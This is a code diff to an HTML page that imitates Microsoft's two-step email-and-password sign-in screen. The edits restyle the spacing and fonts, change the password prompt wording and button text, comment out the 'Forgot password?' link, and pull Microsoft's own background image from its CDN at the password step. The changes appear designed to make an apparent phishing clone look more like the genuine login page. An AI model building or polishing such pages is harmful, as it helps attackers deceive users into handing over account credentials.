@@ -31,21 +31,22 @@
 
         .logo {
             width: 100px;
-            margin-bottom: 15px
+            margin-bottom: 25px
         }
 
         .title1 {
             font-size: 22px;
             font-weight: bold;
-            margin-bottom: -5px;
+            margin-bottom: 5px;
             margin-top: -5px;
         }
 
         .title2 {
             font-size: 22px;
-            font-weight: bold;
-            /* margin-bottom: 10px; */
-            margin-top: -10px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            margin-top: 5px;
+            text-align: center;
         }
 
         .input-group {
@@ -93,13 +94,17 @@
 
         .email-pill {
             display: inline-block;
-            background-color: #f3f2f1;
-            color: #000;
+            /* background-color: #f3f2f1; */
+            border: 1px solid #ccc;
+            color: #000000b6;
             font-size: 14px;
             padding: 6px 14px;
             border-radius: 999px;
-            margin-bottom: 20px;
-            margin-top: -2px;
+            margin: 10px auto 20px auto;
+            /* Auto margins for horizontal centering */
+            display: block;
+            /* Full width so margin auto works */
+            text-align: center;
         }
 
         .btn {
@@ -182,21 +187,35 @@
 
         .alt-link {
             text-align: left;
-            margin-top: 20px;
-            font-size: 14px;
+            margin-top: 25px;
+            font-size: 15px;
+            text-align: center;
         }
 
         .alt-link a {
             color: #0067C5;
+            font-weight: 500;
             text-decoration: none;
             margin-bottom: 10px;
             text-align: center;
         }
 
         .sub-btn {
-            width: 100%;
-            margin-bottom: 10px;
-            margin-top: -5px;
+            width: 380px;
+            margin-bottom: 35px;
+            margin-right: -16px;
+            margin-top: 12px;
+            border-radius: 5px;
+        }
+
+        body.step2-active {
+            background: url("https://logincdn.msftauth.net/shared/5/images/fluent_web_light_57fee22710b04cebe1d5.svg") no-repeat center center fixed;
+            background-size: cover;
+            -webkit-background-size: cover;
+            -moz-background-size: cover;
+            -o-background-size: cover;
+            background-size: cover;
+            /* background-position-y: -50px; */
         }
     </style>
 </head>
@@ -231,7 +250,7 @@
             <!-- Step 2 -->
             <div class="step step-2 hidden">
                 <div class="email-pill" id="displayEmail"></div>
-                <div class="title2">Enter password</div>
+                <div class="title2">Enter your password</div>
                 <div class="input-group password-group">
                     <input type="password" id="password" name="pass" placeholder="Password" autocomplete="new-password"
                         required>
@@ -242,10 +261,10 @@
                         </svg>
                     </span>
                 </div>
-                <div class="links">
+                <!-- <div class="links">
                     <a href="#">Forgot password?</a>
-                </div>
-                <button type="submit" class="btn sub-btn">Sign in</button>
+                </div> -->
+                <button type="submit" class="btn sub-btn">Next</button>
                 <div class="alt-link">
                     <a href="#">Sign in with a different account</a>
                 </div>
@@ -298,6 +317,7 @@
                 step1.classList.add('hidden');
                 step2.classList.remove('hidden');
                 footer.style.display = "none";
+                document.body.classList.add('step2-active');
                 document.getElementById('password').focus();
             }
         }
